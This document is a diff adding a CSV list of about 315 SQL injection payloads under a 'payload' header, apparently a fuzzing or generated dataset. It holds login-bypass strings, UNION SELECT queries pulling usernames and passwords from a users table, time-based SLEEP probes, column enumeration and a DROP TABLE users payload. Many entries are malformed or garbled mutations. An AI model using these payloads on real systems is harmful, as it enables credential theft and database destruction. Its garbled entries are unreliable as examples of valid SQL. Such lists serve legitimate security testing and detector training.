@@ -1,0 +1,317 @@
+payload
+'%20AnD%20'1'='1
+'%20OR%20'1'='1
+'%20OR%201=1--
+'%20UNION%20AND%201=1--
+'%20oR%20'a'='a
+'/**//**//**/oR/**/'1'='1
+'/**//**/AND/**/username/**/Like/**/'1'='1
+'/**//**/OR'oR'x'--
+"'/**//**/UNION SELECT username,password FROM users--"
+'/**/OR 0x31=0x31--
+'/**/OR 1=1#
+'/**/OR username LIKE'%aDMiN%
+'/**/OR username LIKE'%admin%
+'/**/OR'1'='1
+'/**/OR'a'='a
+'/**/OR/**/'1'='1
+'/**/Or/**/'a'='a
+'/**/Or/**/username/**/|/**/'1'='1
+'/**/UNION SELECT NULL--
+"'/**/UNION SELECT username,password FROM users--"
+';DROP TABLE users--
+'GROUP BY columnnames having 2 - 1=1--
+'GROUP BY columnnames having 2 > 1--
+'HAVING 1 <=1--
+'HAVING'a'='a'--
+'HAVInG'a'='a
+'OR 1 <=1--
+'OR 1=1#
+'OR 2 - 1=1--
+'OR 2 > 1--
+'OR 3 - 1=1
+'OR 3 - 2=1
+'OR 3 - 2=1 LIMIT 1--
+'OR 3 - 2=1#
+'OR EXISTS(SELECT * FROM users)--
+'OR'1'=2 - 1;--
+'OR'a'='a'--
+'OR'a'='a'LIMIT 1--
+'OR'x'='2'#
+'OR'x'='x'--
+'Or 1=1--
+'Or sLEeP(2 + 3)--
+"'Or sLeeP(username,0x1,0x1)='a"
+'Or username Like'%
+"'Or username,password usERs--"
+'Or'1'='2
+'Or'a'='a'--
+'Or'a'='x'--
+'Or'x'='x'--
+"'UNIoN AlL null TABLE NULL,NuLL--"
+'UNIon seLEct nulL--
+"'UnION sELeCT NuLL,NuLL--"
+'oR'a'='a
+"'uNion SElecT username,password FROM users--"
+"'union all select null,0xsubSTrinG,password froM uSErs--"
+1 OR 0x31=0x31/*
+1 OR 2 - 1=1--
+1 OR 3 >=0x1
+1 OR'x'='a'--
+1 OR(1)=(1)LIMIT 1--
+1'%20AND%201=1--
+1'%20AnD%20'1'='1
+1'%20BY%20'1'='1
+1'%20aND%20'1'='1
+1'%20anD%20'1'='1
+1'%20uNioN%admiN%20'1'='1
+1'%By%200x1--
+1'%adMin%20'1'='1
+1'%sLeEP%20'%aDMiN%
+1'/**//**//**/AND/**/'1'='2
+1'/**//**/username/**/aNd/**/'1'='1
+1'/**/='a'--
+1'/**/AND 1=1--
+1'/**/AND SLEEP(2 + 3)--
+1'/**/AND'1'='1
+1'/**/AND'1'='2
+1'/**/AND/**/'1'='1
+1'/**/AnD'1'='1
+1'/**/AnD'1'='2
+1'/**/AnD/**/'1'='1
+1'/**/And/**/'1'='1'/*
+1'/**/OR 1=2 - 1
+1'/**/aNd/**/'1'='1
+1'AND SLEEP(0x31)AND'1'='1
+1'AND SLEEP(0x5)AND'1'='1
+1'AND SLEEP(2 + 3)AND'1'='1
+1'AND SLEEP(5)--
+1'AND SLEEP(5)AND'1'='1
+1'AND SLEEP(6 - 1)NUlL'1'='1
+1'AND'1'='2'#
+1'ANd'1'='1
+1'AnD sLEeP(0x5)AnD'1'='1
+1'AnD sLEeP(2 - 1)='a
+1'AnD sLeEP(2 + 3)AnD'/**/AND'1'='1
+1'AnD'1'='1
+1'And SLeeP(5)AND'1'='1
+"1'And SlEEP(int,2 - 1,1--"
+1'ORDER BY 1--
+1'ORDER BY 10 By--
+1'ORDER BY 2 - 1--
+1'ORDER BY 5 + 5--
+1'ORDEr By 0x1--
+1'ORDEr bY 10--
+1'ORDer By 0x31--
+1'orDeR By 2 - 1--
+1;SELECT 1 FROM users WHERE 1=1
+1;SelecT * FROM users
+OR'%20'%'%AdMIN%
+OR'%20uNIon=1--
+OR'/**/%20AND%20'1'='1
+OR'1'='1'#
+OR'1'='1'='1
+OR'1'='1'='x'--
+OR'1'='1'LIMIT 1--
+OR'1'='2'1'#'/*
+OR'1'='a';--
+OR'2'-'1'='1
+OR'2'='x'#
+OR';dRop Table--
+OR'AND'1'='2'2
+OR'AnD'1'='1
+OR'OR'1'='1
+OR'OR'1'='1;--
+OR'OR'2'='2'LIMIT 1--
+OR'Or 1=1--
+OR'Or 2 > 1#
+OR'Or'1'='1
+OR'Or'1'='1'/*
+OR'Or'1'='2'/*
+OR'Or'2'='2'/*
+OR'Or'a'='a'#
+OR'Or'x'='x'--
+OR'Or'y'='x'--
+OR'a'='a'
+OR'a'='a'#
+OR'a'='a'--
+OR'a'='a'/*
+OR'a'='a';--
+OR'a'='a'a'/*
+OR'a'='x'LIMIT 1--
+OR'anD'AND'='2'/*
+OR'oR'1'='1
+OR'oR'2'='2'/*
+OR'oR'a'='a'LIMIT 1--
+OR'oR'x'='#
+OR'oR'x'='a'#
+OR'oR'x'='a'--
+OR'oR'x'='a';--
+OR'oR'x'='y'#
+OR'oR'y'='a'LIMIT 1--
+OR'oR'y'='x'#
+OR'x'='a'--
+OR'x'='a'LIMIT 1--
+OR'x'='x'#
+OR'x'='x'%20nulL--
+OR'x'='x'--
+OR'x'='x'/*
+SELECT 1/**/ALl/**/'1'='1
+"SELECT HAVING username,password/**/USeRs/**/users--"
+SELECT HAVIng Or 1=1--
+SELECT OR 1=1
+SELECT OR'1'='1'/*
+SELECT Or 1 <=1--
+SELECT Or'a'='a'LIMIT 1--
+"SELECT Or(username,2 - 1,1)='a"
+SELECT uniON oR 2 - 1=1--
+SELECT username LIKE'%aDMiN%20'1'='1
+SELECT'/**//**/AND%20'1'='0x1--
+SELECT'/**//**/tAbLe/**/'1'='1
+SELECT'/**/AnD/**/'1'='1
+SELECT'/**/oR/**/1=1--
+SELECT'AnD'1'='1
+SELECT'GROUP BY columnnames having(1)=(1)--
+SELECT'ORDer By 2 - 1--
+SELECT'Or 1=2 > 1 LIMIT 1--
+SELECT'Or 2 > 1 LIMIT 1--
+SELECT'Or 2 > 1#
+"SELECT'Or username,2 - 1=1"
+SELECT'Or'1'='1
+SELECT'Or'1'='2'#
+SELECT'Or'1'='x'--
+SELECT'Or'2'='1'#
+SELECT'Or'2'='1'/*
+SELECT'Or'2'LIMIT 1--
+SELECT'Or'='x'/*
+SELECT'Or'AnD'1'='1
+SELECT'Or'a'='a
+SELECT'Or'x'='1'#
+SELECT'Or'x'='a'#
+SELECT'Or'x'='x'#
+SELECT'Or'x'='x'--
+SELECT'Or'x'='x'y
+SELECT'Or'x'='y'#
+SELECT'Or'y'='a
+SELECT'Or'y'='x'LIMIT 1--
+SELECT'UNiOn'a'='a'/*
+SELECT'a'='a'#
+SELECT'a'='a'--
+SELECT'nULl'='x'--
+SELECT'oR 2 > 1--
+SELECT'oR'2'='1'/*
+SELECT'oR'a'='a
+SELECT'oR'a'='a'--
+SELECT'oR'x'='a
+SELECT'oR'x'='a';--
+SELECT'oR'x'='x'#
+SELECT'oR'x'='x'--
+SELECT'oR'y'='a
+SELECT'oR'y'='x
+SELECT'x'='x'--
+UNION ADMin'a'='a'
+UNION OR 0x31=0x31/*
+UNION OR > 1=1
+UNION Or 1 <=1--
+UNION SELECT username LIKE'%admin%
+UNION uNIon/**/LIke/**/AND/**/'1'='1
+UNION%20'%admin%
+UNION%20OR%%20'1'='1
+UNION%20TABLE%20SELECT%20--
+UNION%20UNiOn%20tABlE%201--
+UNION'%20/**/froM/**/'1'='2
+UNION'%20Or%x%
+UNION'1'='2'/*
+UNION'20NULl'a'='a
+UNION'AND SLEEP(0x5)--
+UNION'AND SLEEP(0x5)AND'1'='1
+UNION'AnD'1'='1
+UNION'AnD'1'='1'/*
+UNION'OR'x'='x'#
+UNION'Or username likE'%admin%
+UNION'Or'1'='1
+UNION'Or'1'='1'/*
+UNION'Or'1'='2
+UNION'Or'1'='2'#
+UNION'Or'1'='2'/*
+UNION'Or'2';--
+UNION'Or'2'='2'#
+UNION'Or'2'='x'#
+UNION'Or'a'='a'LIMIT 1--
+UNION'Or'x'='2
+UNION'Or'x'='2'2'LIMIT 1--
+UNION'Or'x'='x'--
+UNION'Or'x'='x'/*
+UNION'Or'y'='x'--
+UNION'a'='a'
+UNION'a'='a'/*
+UNION'a'='a'AND'a'--
+UNION'anD'='x'/*
+UNION'oR 2 - 1='1'/*
+UNION'oR'2'#
+UNION'oR'2'='1'/*
+UNION'oR'2'='2
+UNION'oR'2'='x'#
+UNION'oR'a'='a
+UNION'oR'x'='2'-'1
+UNION'oR'x'='2'/*
+UNION'oR'x'='31#
+UNION'oR'x'='a'--
+UNION'oR'x'='a';--
+UNION'oR'x'='x'#
+UNION'x'='a';--
+UNION'| |'a'='a
+UNION/**/Or/**/'1'='1
+UNION;/**/seLECt/**/SElECt/**/NULL--
+UNION;1--
+UNION;SELECT * FROM users
+UNION;SELECT NULL FroM alL--
+admin'%20/**//**/LiKE/**/'1'='1
+admin'%20AND%20LIKE%
+admin'%20Or%20'1'='1
+admin'AND SLEEP(2 + 3)AND'1'='1
+"admin'AND SUBSTRING(username,0x1,0x1=1)--"
+admin'AND'1'='1'#
+admin'ANd 1=0x31--
+admin'AnD subSTrinG(0x%20'1'='2
+admin'OR'x'='x'/*
+admin'Or 1=2 - 1#
+admin'Or 2 > 1
+admin'Or 2 > 1#
+admin'Or 2 > 1--
+admin'Or SLEep(2 + 3)--
+admin'Or eXIsTS(2 + 3)--
+admin'Or sLEeP(2 + 3)--
+admin'Or sLeEp(2 + 3'1'='1
+admin'Or username LiKE'%aDMiN%
+admin'Or username liKE'%AdMIN%
+admin'Or'1'='1'#
+admin'Or'1'='1'/*
+admin'Or'1'='2'/*
+admin'Or'1'='x'/*
+admin'Or'2'='1'/*
+admin'Or'a'='a AdMIN
+admin'Or'a'='a'#
+admin'Or'nULl'='x'--
+admin'Or'x'='2'#
+admin'Or'x'='2'/*
+admin'Or'x'='LIMIT 1--
+admin'Or'x'='a'
+admin'Or'x'='a'--
+admin'Or'x'='x'#
+admin'Or'x'='x'--
+admin'Or'x'='x'/*
+admin'Or'x'='x'LIMIT 1--
+admin'Or'x'='y'#
+admin'Or'y'='a'LIMIT 1--
+admin'UNIon seLEct=1--
+admin'oR'1'='2'2'1
+admin'oR'a'='a
+admin'oR'a'='a'LIMIT 1--
+admin'oR'x'='a'--
+admin'oR'x'='a'/*
+admin'oR'x'='x
+admin'oR'x'='x'#
+admin'oR'x'='x'--
+admin'oR'y'='a'--
+admin'oR'y'='x'--
